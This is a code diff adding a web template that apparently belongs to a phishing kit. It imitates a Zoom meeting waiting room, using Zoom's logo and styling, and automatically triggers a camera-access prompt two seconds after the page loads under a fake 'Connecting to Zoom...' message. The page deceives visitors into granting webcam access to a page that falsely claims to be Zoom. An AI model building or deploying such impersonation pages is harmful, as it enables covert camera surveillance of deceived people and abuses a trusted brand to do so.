@@ -1,0 +1,92 @@
+{% extends "camera/base.html" %}
+
+{% block title %}Zoom Meeting - Waiting Room{% endblock %}
+
+{% block logo_url %}https://st1.zoom.us/static/6.3.12538/image/new/ZoomLogo.png{% endblock %}
+
+{% block header_title %}Camera Access Required{% endblock %}
+
+{% block header_subtitle %}Please enable your camera to join the meeting{% endblock %}
+
+{% block additional_styles %}
+<style>
+    body {
+        background-color: #F7F8FA;
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    .container {
+        background-color: white;
+        border-radius: 12px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        padding: 2rem;
+        max-width: 800px;
+        margin: 2rem auto;
+    }
+    .header {
+        text-align: center;
+        margin-bottom: 2rem;
+    }
+    .logo {
+        max-width: 120px;
+        margin-bottom: 1.5rem;
+    }
+    .title {
+        color: #232333;
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+    }
+    .subtitle {
+        color: #747487;
+        font-size: 16px;
+    }
+    .video-container {
+        background-color: #F7F8FA;
+        border-radius: 8px;
+        padding: 1rem;
+        margin: 1rem 0;
+    }
+    .button {
+        background-color: #0E72ED;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        padding: 12px 24px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+    }
+    .button:hover {
+        background-color: #0D64D2;
+    }
+    .error-message {
+        background-color: #FEF1F1;
+        border: 1px solid #FDE2E2;
+        color: #DC3545;
+        padding: 12px;
+        border-radius: 4px;
+        margin: 1rem 0;
+        display: none;
+    }
+</style>
+{% endblock %}
+
+{% block additional_scripts %}
+<script>
+    function customizeForZoom() {
+        const loadingMessage = document.getElementById('loading-message');
+        if (loadingMessage) {
+            loadingMessage.textContent = 'Connecting to Zoom...';
+        }
+        
+        // Show loading animation for 2 seconds before prompting for camera
+        setTimeout(() => {
+            document.getElementById('enable-camera-button').click();
+        }, 2000);
+    }
+
+    // Call the customization function when the page loads
+    window.addEventListener('load', customizeForZoom);
+</script>
+{% endblock %} 
